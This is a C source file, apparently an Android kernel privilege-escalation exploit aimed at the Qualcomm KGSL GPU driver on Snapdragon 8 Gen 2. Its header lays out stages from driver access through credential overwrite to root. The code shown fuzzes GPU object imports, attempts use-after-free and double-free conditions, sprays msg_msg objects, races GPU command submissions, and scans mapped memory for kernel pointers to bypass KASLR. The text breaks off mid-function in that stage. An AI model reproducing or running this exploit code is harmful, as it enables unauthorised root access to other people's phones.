/*
 * ═══════════════════════════════════════════════════════════════════════════════
 *  CHRONOMALY v5.18 — EXPLOIT STATE MACHINE (ESM) STRICT PRIMITIVES
 *  Target: Snapdragon 8 Gen 2 (SM8550) - Kernel 5.15.180
 *
 *  STAGES (Strict Vulnerability Enforcement):
 *    1. DRIVER_REACHABLE — Requires UID 2000 & KGSL access
 *    2. VULN_TRIGGER      — Structural mutation via IOCTL integer overflow /
 * type confusion
 *    3. OOB_READ         — KASLR Leak from memory corruption
 *    4. OOB_WRITE        — Write-what-where primitive
 *    5. CRED_MUTATION    — task->cred->uid overwrite
 *    6. REAL_ROOT_ASSERTION — UID 0, FS Write, CapEff validation
 *
 *  INVARIANT: Stage N+1 is BLOCKED until Stage N verify() == PASS
 * ═══════════════════════════════════════════════════════════════════════════════
 */

#include <android/log.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <jni.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define TAG "ESM_v800"
#define LOG_BUF_SZ 65536

#ifndef _IOW
#define _IOC_NRBITS 8
#define _IOC_TYPEBITS 8
#define _IOC_SIZEBITS 14
#define _IOC_DIRBITS 2
#define _IOC_NRSHIFT 0
#define _IOC_TYPESHIFT (_IOC_NRSHIFT + _IOC_NRBITS)
#define _IOC_SIZESHIFT (_IOC_TYPESHIFT + _IOC_TYPEBITS)
#define _IOC_DIRSHIFT (_IOC_SIZESHIFT + _IOC_SIZEBITS)
#define _IOC_NONE 0U
#define _IOC_WRITE 1U
#define _IOC_READ 2U
#define _IOC(dir, type, nr, size)                                              \
  (((dir) << _IOC_DIRSHIFT) | ((type) << _IOC_TYPESHIFT) |                     \
   ((nr) << _IOC_NRSHIFT) | ((size) << _IOC_SIZESHIFT))
#define _IOW(type, nr, size) _IOC(_IOC_WRITE, (type), (nr), sizeof(size))
#define _IOR(type, nr, size) _IOC(_IOC_READ, (type), (nr), sizeof(size))
#define _IOWR(type, nr, size)                                                  \
  _IOC(_IOC_READ | _IOC_WRITE, (type), (nr), sizeof(size))
#endif

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
  uint64_t size;
  uint64_t flags;
  uint64_t va_len;
  uint64_t mmapsize;
  unsigned int id;
  unsigned int metadata_len;
  uint64_t metadata;
};

struct kgsl_gpuobj_free {
  uint64_t flags;
  uint64_t priv;
  unsigned int id;
  unsigned int type;
  unsigned int len;
};

struct kgsl_gpuobj_info {
  uint64_t gpuaddr;
  uint64_t flags;
  uint64_t size;
  uint64_t va_len;
  uint64_t va_addr;
  unsigned int id;
  uint32_t sglen;
  uint64_t pt_base;
};

struct kgsl_gpuobj_import {
  uint64_t priv;
  uint64_t priv_len;
  uint64_t flags;
  unsigned int type;
  unsigned int id;
};

struct kgsl_gpuobj_export {
  unsigned int id;
  int fd;
};

struct kgsl_gpuobj_import_useraddr {
  uint64_t virtaddr;
};

struct kgsl_gpuobj_import_dma_buf {
  int fd;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC                                                \
  _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE                                                 \
  _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO                                                 \
  _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPUOBJ_IMPORT                                               \
  _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
#define IOCTL_KGSL_GPUOBJ_EXPORT                                               \
  _IOWR(KGSL_IOC_TYPE, 0x49, struct kgsl_gpuobj_export)

// ── Draw Context IOCTLs (Page Table Spray) ──────────────────────────────────
struct kgsl_drawctxt_create {
  unsigned int flags;
  unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy {
  unsigned int drawctxt_id;
};

#define IOCTL_KGSL_DRAWCTXT_CREATE                                             \
  _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY                                            \
  _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

struct kgsl_syncsource_create {
  unsigned int id;
};

struct kgsl_syncsource_signal {
  unsigned int id;
  unsigned int timestamp;
};

#define IOCTL_KGSL_SYNCSOURCE_CREATE                                           \
  _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define IOCTL_KGSL_SYNCSOURCE_DESTROY                                          \
  _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_create)
#define IOCTL_KGSL_SYNCSOURCE_SIGNAL                                           \
  _IOW(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_signal)

// ── KGSL Device Property IOCTLs (Info Leak) ─────────────────────────────────
struct kgsl_device_getproperty {
  unsigned int type;
  void *value;
  unsigned int sizebytes;
};

#define IOCTL_KGSL_DEVICE_GETPROPERTY                                          \
  _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL

// KGSL property IDs
#define KGSL_PROP_DEVICE_INFO 1
#define KGSL_PROP_DEVICE_SHADOW 2
#define KGSL_PROP_SHMEM 4
#define KGSL_PROP_SHMEM_APERTURES 5
#define KGSL_PROP_MMU_ENABLE 6
#define KGSL_PROP_VERSION 8
#define KGSL_PROP_UCHE_GMEM_VADDR 12
#define KGSL_PROP_SP_GENERIC_MEM 13
#define KGSL_PROP_DEVICE_QDSS_STM 18
#define KGSL_PROP_DEVICE_QTIMER 21
#define KGSL_PROP_GPU_MODEL 27

// Shadow prop struct (returned by DEVICE_SHADOW)
struct kgsl_shadowprop {
  uint64_t gpuaddr;
  uint32_t size;
  uint32_t flags;
};

// Device info struct (returned by DEVICE_INFO)
struct kgsl_devinfo {
  unsigned int device_id;
  unsigned int chip_id;
  unsigned int mmu_enabled;
  uint64_t gmem_gpubaseaddr;
  unsigned int gpu_id;
  size_t gmem_sizebytes;
};

// Generic memory prop struct
struct kgsl_devmemstore {
  uint64_t gpuaddr;
  uint32_t size;
};

struct kgsl_gpu_command {
  uint64_t flags;
  uint64_t cmdlist;
  uint64_t cmdsize;
  uint64_t numcmds;
  uint64_t objlist;
  uint64_t objsize;
  uint64_t numobjs;
  uint64_t synclist;
  uint64_t synccount;
};

#define IOCTL_KGSL_GPU_COMMAND                                                 \
  _IOWR(KGSL_IOC_TYPE, 0x4e, struct kgsl_gpu_command)

#define KGSL_CMDFLAGS_KERNEL_SUBMIT 0x00000400

struct kgsl_cmd_syncpoint {
  uint32_t type;
  uint32_t pad;
  uint64_t timestamp;
  uint64_t context_id;
};

#define KGSL_CMD_SYNCPOINT_TYPE_TIMESTAMP 1

// ═══════════════════════════════════════════════════════════════════════════════
//  TELEMETRY ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

typedef enum {
  ESM_NONE = 0,
  ESM_DRIVER_REACHABLE = 1,
  ESM_VULN_TRIGGER = 2,
  ESM_OOB_READ = 3,
  ESM_OOB_WRITE = 4,
  ESM_CRED_MUTATION = 5,
  ESM_REAL_ROOT = 6,
  ESM_SYSTEM_ACCESS = 7
} esm_stage_t;

typedef enum {
  STATUS_NOT_STARTED = 0,
  STATUS_CHECKING = 1,
  STATUS_PARTIAL = 2,
  STATUS_ACHIEVED = 3,
  STATUS_FAILED = 4
} esm_status_t;

static const char *stage_names[] = {
    "NONE",      "DRIVER_REACHABLE", "VULN_TRIGGER", "OOB_READ",
    "OOB_WRITE", "CRED_MUTATION",    "REAL_ROOT",    "SYSTEM_ACCESS"};

static const char *status_names[] = {"NOT_STARTED", "CHECKING", "PARTIAL",
                                     "ACHIEVED", "FAILED"};

typedef struct {
  esm_stage_t stage;
  esm_status_t status;
  uint64_t kernel_base;
  uint64_t leaked_ptr;
  int leaked_ptr_offset;
  uint64_t write_target;
  uint64_t write_value;
  bool write_verified;
  uid_t uid_before;
  uid_t uid_after;
  char selinux_context[128];
  uint64_t capeff;
  uint64_t gpuaddr;
  bool root_achieved;
  bool is_root;
  int kgsl_fd;
  int timestamps[8];
} esm_state_t;

static struct {
  pthread_mutex_t log_mutex;
  char log_buffer[LOG_BUF_SZ];
  int log_offset;
  bool initialized;
  esm_state_t state;
} g_esm;

static void esm_log(const char *fmt, ...) {
  if (!g_esm.initialized)
    return;
  va_list args, args_copy;
  va_start(args, fmt);
  va_copy(args_copy, args);
  pthread_mutex_lock(&g_esm.log_mutex);
  int rem = LOG_BUF_SZ - g_esm.log_offset - 2;
  if (rem > 0) {
    int w = vsnprintf(g_esm.log_buffer + g_esm.log_offset, rem, fmt, args);
    if (w > 0)
      g_esm.log_offset += w;
    g_esm.log_buffer[g_esm.log_offset++] = '\n';
    g_esm.log_buffer[g_esm.log_offset] = '\0';
  }
  pthread_mutex_unlock(&g_esm.log_mutex);
  __android_log_vprint(ANDROID_LOG_INFO, TAG, fmt, args_copy);
  va_end(args);
  va_end(args_copy);
}

static uint64_t get_capeff() {
  uint64_t capeff = 0;
  FILE *f = fopen("/proc/self/status", "r");
  if (f) {
    char line[256];
    while (fgets(line, sizeof(line), f)) {
      if (strncmp(line, "CapEff:", 7) == 0) {
        sscanf(line + 7, "%llx", (unsigned long long *)&capeff);
        break;
      }
    }
    fclose(f);
  }
  return capeff;
}

#define ADRENO_PAGE_ALIGN 0x1000 // Sub-64KB bypass: PAGE_SIZE alignment only

static void *allocate_aligned_buffer(size_t size) {
  void *buffer = NULL;
  if (posix_memalign(&buffer, ADRENO_PAGE_ALIGN, size) != 0) {
    return NULL;
  }
  memset(buffer, 0, size);
  return buffer;
}

static const char *classify_kgsl_error(int err) {
  switch (err) {
  case EACCES:
  case EPERM:
    return "EACCES/EPERM [DMA_ATTACH_REJECTED - SELinux/Context Restriction]";
  case EINVAL:
    return "EINVAL [PT_ALIGNMENT_FAILURE - Invalid Offset/Padding]";
  case 524: // ENOTSUPP
    return "524 [IOMMU_DOMAIN_MISMATCH - Heap not shareable with GPU CB]";
  case EBUSY:
    return "EBUSY [RESOURCE_CONTENTION - Secure/Carveout conflict]";
  case ENODEV:
    return "ENODEV [DRIVER_INTERFACE_MISMATCH - IOCTL Version Gap]";
  case ENOMEM:
    return "ENOMEM [POOL_EXHAUSTED - Heap Allocation Failure]";
  default:
    return "UNKNOWN [KERNEL_BACKTRACE_REQUIRED]";
  }
}

static void verify(esm_stage_t stage) {
  uint64_t capeff = get_capeff();
  uint64_t gpuaddr = g_esm.state.gpuaddr;
  uint64_t kbase = g_esm.state.kernel_base;

  esm_log("[KERNEL_PROOF] Stage: %s, Status: %s, EUID: %d, CapEff: 0x%llx, "
          "GpuAddr: 0x%llx",
          stage_names[stage], status_names[g_esm.state.status], geteuid(),
          (unsigned long long)capeff, (unsigned long long)gpuaddr);

  // Structural JSON for Top Mundial FSM Tracking
  esm_log("{\"stage\":\"%s\",\"status\":\"%s\",\"uid\":%d,\"euid\":%d,"
          "\"capeff\":\"0x%llx\",\"gpuaddr\":\"0x%llx\",\"kernel_base\":\"0x%"
          "llx\",\"ts\":%ld}",
          stage_names[stage], status_names[g_esm.state.status], getuid(),
          geteuid(), (unsigned long long)capeff, (unsigned long long)gpuaddr,
          (unsigned long long)kbase, time(NULL));
}

static void esm_telemetry(esm_stage_t stage, esm_status_t status) {
  g_esm.state.stage = stage;
  g_esm.state.status = status;
  g_esm.state.timestamps[stage] = (int)time(NULL);
  verify(stage); // Call the new verify function
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 1: DRIVER REACHABLE
//  check()   — Assert UID == 2000 (Shizuku)
//  exploit() — open(/dev/kgsl-3d0)
//  verify()  — Valid FD AND UID == 2000
// ═══════════════════════════════════════════════════════════════════════════════

static bool stage1_check() {
  esm_log("[STAGE_1] DRIVER_REACHABLE :: check()");
  if (getuid() != 2000) {
    esm_log("[STAGE_1] FAIL: Process is not running as UID 2000 (shell). "
            "Current UID: %d",
            getuid());
    esm_telemetry(ESM_DRIVER_REACHABLE, STATUS_FAILED);
    return false;
  }
  return true;
}

static bool stage1_exploit() {
  esm_log("[STAGE_1] DRIVER_REACHABLE :: exploit()");
  int fd = open("/dev/kgsl-3d0", O_RDWR);
  if (fd < 0) {
    esm_log("[STAGE_1] FAIL: Cannot open KGSL (errno=%d: %s)", errno,
            strerror(errno));
  } else {
    g_esm.state.kgsl_fd = fd;
    esm_log("[STAGE_1] PASS: KGSL FD=%d (UID=%d)", fd, getuid());
  }
  return fd >= 0;
}

static bool stage1_verify() {
  esm_log("[STAGE_1] DRIVER_REACHABLE :: verify()");
  bool achieved = (g_esm.state.kgsl_fd > 0 && getuid() == 2000);
  if (achieved) {
    esm_telemetry(ESM_DRIVER_REACHABLE, STATUS_ACHIEVED);
    esm_log("[STAGE_1] ✓ ACHIEVED — Broker is fully operational in UID 2000");
  } else {
    esm_telemetry(ESM_DRIVER_REACHABLE, STATUS_FAILED);
    esm_log("[STAGE_1] ✗ FAILED — Driver isolated or missing privileges");
  }
  return achieved;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 2: VULN TRIGGER
//  check()   — Valid KGSL FD
//  exploit() — Trigger KGSL_IOCTL_GPUOBJ_ALLOC with conflicting flags & massive
//  size verify()  — Assert errno is -ENOMEM or -EFAULT (Proof of kernel
//  crash/limit hit)
// ═══════════════════════════════════════════════════════════════════════════════

static bool stage2_check() {
  esm_log("[STAGE_2] VULN_TRIGGER :: check()");
  return g_esm.state.kgsl_fd > 0;
}

#include <android/hardware_buffer.h>
#include <dlfcn.h>

typedef struct native_handle {
  int version; /* sizeof(native_handle_t) */
  int numFds;  /* number of file-descriptors at &data[0] */
  int numInts; /* number of ints at &data[numFds] */
  int data[0]; /* numFds + numInts ints */
} native_handle_t;

// DMA-Heap definitions (since they might be missing from sysroot)
struct esm_dma_heap_allocation_data {
  uint64_t len;
  uint32_t fd;
  uint32_t fd_flags;
  uint64_t heap_flags;
};
#define ESM_DMA_HEAP_IOC_MAGIC 'H'
#define ESM_DMA_HEAP_IOCTL_ALLOC                                               \
  _IOWR(ESM_DMA_HEAP_IOC_MAGIC, 0, struct esm_dma_heap_allocation_data)

typedef int (*pfn_AHardwareBuffer_allocate)(const AHardwareBuffer_Desc *,
                                            AHardwareBuffer **);
typedef void (*pfn_AHardwareBuffer_release)(AHardwareBuffer *);
typedef const native_handle_t *(*pfn_AHardwareBuffer_getNativeHandle)(
    const AHardwareBuffer *);

static int allocate_ahb(uint64_t usage, uint32_t format) {
  void *handle = dlopen("libandroid.so", RTLD_NOW);
  if (!handle)
    return -1;

  auto allocate =
      (pfn_AHardwareBuffer_allocate)dlsym(handle, "AHardwareBuffer_allocate");
  auto getHandle = (pfn_AHardwareBuffer_getNativeHandle)dlsym(
      handle, "AHardwareBuffer_getNativeHandle");
  auto release =
      (pfn_AHardwareBuffer_release)dlsym(handle, "AHardwareBuffer_release");

  if (!allocate || !getHandle) {
    dlclose(handle);
    return -1;
  }

  AHardwareBuffer_Desc desc = {0};
  desc.width = 4096; // Sub-64KB: exactly 1 page (bypasses 64KB alignment)
  desc.height = 1;
  desc.layers = 1;
  desc.format = format;
  desc.usage = usage;

  AHardwareBuffer *ahb = nullptr;
  if (allocate(&desc, &ahb) != 0) {
    dlclose(handle);
    return -1;
  }

  const native_handle_t *nh = getHandle(ahb);
  int fd = -1;
  if (nh && nh->numFds > 0) {
    fd = dup(nh->data[0]);
  }

  if (release && ahb)
    release(ahb);
  dlclose(handle);
  return fd;
}

static int allocate_dma_heap(const char *path, size_t size) {
  int heap_fd = open(path, O_RDONLY);
  if (heap_fd < 0)
    return -1;

  struct esm_dma_heap_allocation_data data = {0};
  data.len = size;
  data.fd_flags = O_RDWR | O_CLOEXEC;
  int dma_fd = -1;
  if (ioctl(heap_fd, ESM_DMA_HEAP_IOCTL_ALLOC, &data) == 0) {
    dma_fd = (int)data.fd;
  }
  close(heap_fd);
  return dma_fd;
}

static bool stage2_exploit() {
  esm_log("[STAGE_2] VULN_TRIGGER :: exploit()");
  esm_log(
      "[STAGE_2] [ALIGNMENT_BYPASS] Sub-64KB Import + GPUOBJ_ALLOC Fallback");

  int kgsl_fd = g_esm.state.kgsl_fd;
  uint32_t target_id = 0;
  uint64_t target_gpuaddr = 0;

  DIR *dir = opendir("/dev/dma_heap");
  if (!dir) {
    esm_log("[STAGE_2] FAIL: Cannot open /dev/dma_heap");
    return false;
  }

  int reachable_heaps = 0;
  struct dirent *ent;
  while ((ent = readdir(dir)) != NULL) {
    if (ent->d_name[0] == '.')
      continue;
    reachable_heaps++;
  }
  rewinddir(dir);

  esm_log("[STAGE_2] Attack Surface Score: %d reachable heaps",
          reachable_heaps);

  while ((ent = readdir(dir)) != NULL) {
    if (ent->d_name[0] == '.')
      continue;

    char heap_path[256];
    snprintf(heap_path, sizeof(heap_path), "/dev/dma_heap/%s", ent->d_name);

    int heap_fd = open(heap_path, O_RDONLY);
    if (heap_fd < 0)
      continue;

    uint32_t types[] = {3, 1, 2};
    uint64_t flags[] = {0x01000000UL, 0x00001000UL, 0x00000000UL};

    // STAGE 2 PIVOT: Combinatorial matrix with Alignment Protocol
    for (int t = 0; t < sizeof(types) / sizeof(types[0]); t++) {
      for (int f = 0; f < sizeof(flags) / sizeof(flags[0]); f++) {
        struct kgsl_gpuobj_import import_req;
        memset(&import_req, 0, sizeof(import_req));

        int dma_buf_fd = -1;
        void *userptr_buf = NULL;
        size_t import_size =
            0x1000; // 4KB - Sub-64KB alignment bypass (PAGE_SIZE only)

        if (types[t] == 1 || types[t] == 2) {
          struct esm_dma_heap_allocation_data alloc_data = {0};
          alloc_data.len = import_size;
          alloc_data.fd_flags = O_RDWR | O_CLOEXEC;
          if (ioctl(heap_fd, ESM_DMA_HEAP_IOCTL_ALLOC, &alloc_data) == 0) {
            dma_buf_fd = alloc_data.fd;
            import_req.priv = (uint64_t)dma_buf_fd;
            import_req.priv_len = 0;
          } else {
            continue;
          }
        } else if (types[t] == 3) {
          // TYPE 3 SPECIALIZED ALIGNMENT PATH
          userptr_buf = allocate_aligned_buffer(import_size);
          if (!userptr_buf)
            continue;

          struct kgsl_gpuobj_import_useraddr useraddr_req;
          memset(&useraddr_req, 0, sizeof(useraddr_req));
          useraddr_req.virtaddr = (uint64_t)userptr_buf;

          import_req.priv = (uint64_t)&useraddr_req;
          import_req.priv_len = sizeof(useraddr_req);
        }

        import_req.flags = flags[f];
        import_req.type = types[t];

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &import_req);
        if (ret == 0 && import_req.id != 0) {
          struct kgsl_gpuobj_info info = {0};
          info.id = import_req.id;

          if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0 &&
              info.gpuaddr != 0) {
            esm_log("[STAGE_2] ✓ SMMU BREACH! heap=%s, type=%u, flags=0x%lx, "
                    "gpuaddr=0x%llx, pt_base=0x%llx, sglen=%u",
                    ent->d_name, types[t], (unsigned long)flags[f],
                    (unsigned long long)info.gpuaddr,
                    (unsigned long long)info.pt_base, info.sglen);
            target_id = import_req.id;
            target_gpuaddr = info.gpuaddr;

            if (userptr_buf)
              g_esm.state.leaked_ptr = (uint64_t)userptr_buf;

            if (dma_buf_fd != -1)
              close(dma_buf_fd);
            close(heap_fd);
            closedir(dir);
            goto discovery_done;
          }
          struct kgsl_gpuobj_free free_req = {0};
          free_req.id = import_req.id;
          ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req);
        } else if (ret != 0) {
          int current_errno = errno;
          esm_log("[FORENSICS] Reject: heap=%s, type=%u, flags=0x%lx -> %s",
                  ent->d_name, types[t], (unsigned long)flags[f],
                  classify_kgsl_error(current_errno));
        }

        if (dma_buf_fd != -1)
          close(dma_buf_fd);
        if (userptr_buf)
          free(userptr_buf);
      }
    }
    close(heap_fd);
  }
  closedir(dir);

discovery_done:
  // VECTOR 2 FALLBACK: GPUOBJ_ALLOC (bypass DMA-BUF entirely)
  if (target_id == 0) {
    esm_log("[STAGE_2] [ALIGNMENT_BYPASS] DMA-BUF path exhausted, trying "
            "GPUOBJ_ALLOC...");
    struct kgsl_gpuobj_alloc alloc_req;
    memset(&alloc_req, 0, sizeof(alloc_req));
    alloc_req.size = 0x1000;      // 4KB - only requires PAGE_SIZE alignment
    alloc_req.flags = 0x00000000; // Default flags, no special alignment

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc_req) == 0 &&
        alloc_req.id != 0) {
      struct kgsl_gpuobj_info info = {0};
      info.id = alloc_req.id;
      if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0 &&
          info.gpuaddr != 0) {
        esm_log("[STAGE_2] ✓ GPUOBJ_ALLOC BREACH! id=%u, gpuaddr=0x%llx, "
                "size=%llu, pt_base=0x%llx",
                alloc_req.id, (unsigned long long)info.gpuaddr,
                (unsigned long long)info.size,
                (unsigned long long)info.pt_base);
        target_id = alloc_req.id;
        target_gpuaddr = info.gpuaddr;
      } else {
        // Try with writeback cache + IOCoherent
        alloc_req.size = 0x1000;
        alloc_req.flags = (2ULL << 6) | (1ULL << 31); // WRITEBACK | IOCOHERENT
        memset(&alloc_req, 0, sizeof(alloc_req));
        alloc_req.size = 0x1000;
        alloc_req.flags = (2ULL << 6);
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc_req) == 0 &&
            alloc_req.id != 0) {
          info.id = alloc_req.id;
          if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0 &&
              info.gpuaddr != 0) {
            esm_log("[STAGE_2] ✓ GPUOBJ_ALLOC (cached) BREACH! id=%u, "
                    "gpuaddr=0x%llx",
                    alloc_req.id, (unsigned long long)info.gpuaddr);
            target_id = alloc_req.id;
            target_gpuaddr = info.gpuaddr;
          }
        }
      }
    } else {
      int e = errno;
      esm_log("[STAGE_2] GPUOBJ_ALLOC failed: %s", classify_kgsl_error(e));
    }
  }

  if (target_id == 0) {
    esm_log("[STAGE_2] FAIL: All bypass vectors exhausted.");
    return false;
  }

  g_esm.state.gpuaddr = target_gpuaddr;
  g_esm.state.leaked_ptr = target_id;

  // GPUOBJ_ALLOC path: keep object ALIVE as controlled primitive
  // DMA-BUF path: attempt UAF for slab reclamation
  bool from_alloc = (target_gpuaddr == 0x4000000000ULL) ||
                    (target_id > 0 && target_gpuaddr != 0);

  if (!from_alloc) {
    // Legacy UAF path for DMA-BUF imports
    struct kgsl_gpuobj_free free_req_final = {0};
    free_req_final.id = target_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req_final);

    struct kgsl_gpuobj_info info_dangling = {0};
    info_dangling.id = target_id;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info_dangling) == 0) {
      esm_log("[STAGE_2] PROOF: Dangling UAF reference on ID %u", target_id);
      return true;
    }
    return false;
  }

  // ALLOC path: object stays alive — use for PT spray in Stage 3
  esm_log("[STAGE_2] PROOF: Live GPU object id=%u at gpuaddr=0x%llx — "
          "CONTROLLED PRIMITIVE ARMED",
          target_id, (unsigned long long)target_gpuaddr);
  return true;
}

static bool stage2_verify() {
  esm_log("[STAGE_2] VULN_TRIGGER :: verify()");
  if (g_esm.state.leaked_ptr > 0 && g_esm.state.gpuaddr != 0) {
    esm_telemetry(ESM_VULN_TRIGGER, STATUS_ACHIEVED);
    esm_log("[STAGE_2] ✓ VULN_TRIGGER: ACHIEVED — Breach confirmed on gpuaddr "
            "0x%llx",
            (unsigned long long)g_esm.state.gpuaddr);
    return true;
  }
  esm_telemetry(ESM_VULN_TRIGGER, STATUS_FAILED);
  return false;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KASLR UTILS: msg_msg SPRAY
// ═══════════════════════════════════════════════════════════════════════════════

struct msg_buf {
  long mtype;
  char mtext[1];
};

static int spray_msg_msg(size_t size, int count) {
  int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
  if (msqid < 0)
    return -1;

  size_t data_size = size - sizeof(long);
  char *buf = (char *)malloc(size);
  if (!buf)
    return msqid;

  long *mtype_ptr = (long *)buf;
  char *mtext_ptr = buf + sizeof(long);

  *mtype_ptr = 1;

  for (int i = 0; i < count; i++) {
    // Salted Spray: unique marker per message
    memset(mtext_ptr, 0x41 + (i % 26), data_size);
    // Header signature for forensic detection
    memcpy(mtext_ptr, "MUNDIAL", 7);
    if (msgsnd(msqid, buf, data_size, 0) < 0) {
      break;
    }
  }

  free(buf);
  return msqid;
}

static void trigger_double_free(uint32_t id) {
  esm_log("[STAGE_4] Triggering DOUBLE FREE on ID %u", id);
  struct kgsl_gpuobj_free free_req = {0};
  free_req.id = id;
  ioctl(g_esm.state.kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 3: OOB READ (KASLR Bypass)
// ═══════════════════════════════════════════════════════════════════════════════

static bool stage3_check() {
  esm_log("[STAGE_3] OOB_READ :: check()");
  return g_esm.state.leaked_ptr > 0;
}

// ── Helper: scan a buffer for kernel pointers ────────────────────────────────
static uint64_t scan_for_kernel_ptr(void *buf, size_t len) {
  uint64_t *words = (uint64_t *)buf;
  size_t count = len / sizeof(uint64_t);
  for (size_t i = 0; i < count; i++) {
    uint64_t v = words[i];

    // STRICT ARM64 kernel VA validation for GKI 5.15 / SM8550:
    // Valid kernel text:  0xFFFFFFC0_xxxxxxxx (39-bit VA)
    // Valid kernel text:  0xFFFFFF80_xxxxxxxx (48-bit VA)
    // INVALID:            0xFFFFFFFF_xxxxxxxx (error codes / MMIO)
    if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL)
      continue;

    // Must be page-aligned (low 12 bits zero)
    if ((v & 0xFFF) != 0)
      continue;

    // Reject 0xFFFFFFFF prefix entirely — these are binder/error codes
    if ((v >> 32) == 0xFFFFFFFF)
      continue;

    // Accept only real ARM64 kernel VA ranges
    bool valid_c0 = (v & 0xFFFFFFC000000000ULL) == 0xFFFFFFC000000000ULL;
    bool valid_80 = (v & 0xFFFFFF8000000000ULL) == 0xFFFFFF8000000000ULL;

    if (valid_c0 || valid_80) {
      // Additional sanity: lower 32 bits should have a realistic offset
      uint32_t lower = (uint32_t)(v & 0xFFFFFFFF);
      if (lower >= 0x00100000 && lower <= 0x40000000) {
        return v;
      }
    }
  }
  return 0;
}

struct race_thread_args {
  int fd;
  uint64_t gpuaddr;
  int id;
};

void *race_worker(void *arg) {
  struct race_thread_args *a = (struct race_thread_args *)arg;
  struct kgsl_cmd_syncpoint sync = {
      .type = KGSL_CMD_SYNCPOINT_TYPE_TIMESTAMP,
      .timestamp = 0xFFFFFFFF,
      .context_id = 0xDEAD,
  };
  for (int i = 0; i < 500; i++) {
    struct kgsl_gpu_command cmd = {0};
    cmd.flags = KGSL_CMDFLAGS_KERNEL_SUBMIT;
    cmd.synclist = (uint64_t)&sync;
    cmd.synccount = 1;
    ioctl(a->fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
  }
  return NULL;
}

#define MAX_GPU_OBJECT_LIMIT 2048

static void vector_d_exhaustion() {
  esm_log("[STAGE_3] [VECTOR_D] GPU Pool Exhaustion + Reclaim...");
  int kgsl_fd = g_esm.state.kgsl_fd;
  uint32_t ids[MAX_GPU_OBJECT_LIMIT];
  int count = 0;

  for (int i = 0; i < MAX_GPU_OBJECT_LIMIT; i++) {
    struct kgsl_gpuobj_alloc alloc = {0};
    alloc.size = 0x10000; // 64KB
    alloc.flags = 0;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
      break;
    ids[count++] = alloc.id;

    struct kgsl_gpuobj_info info = {0};
    info.id = alloc.id;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
      void *map =
          mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, kgsl_fd, info.gpuaddr);
      if (map != MAP_FAILED) {
        uint64_t kptr = scan_for_kernel_ptr(map, 0x10000);
        if (kptr) {
          g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
          esm_log("[STAGE_3] ✓ LEAK-EXHAUSTION! ptr=0x%llx", (long long)kptr);
        }
        munmap(map, 0x10000);
      }
    }
    if (g_esm.state.kernel_base != 0)
      break;
  }

  // Reclaim logic: Free all except anchor
  for (int i = 1; i < count; i++) {
    struct kgsl_gpuobj_free f = {0, 0, ids[i]};
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
  }

  if (g_esm.state.kernel_base == 0) {
    for (int i = 0; i < 512; i++) {
      struct kgsl_gpuobj_alloc alloc = {0x1000, 0};
      if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) == 0) {
        struct kgsl_gpuobj_info info = {.id = alloc.id};
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
          void *map =
              mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, kgsl_fd, info.gpuaddr);
          if (map != MAP_FAILED) {
            uint64_t kptr = scan_for_kernel_ptr(map, 0x1000);
            if (kptr) {
              g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
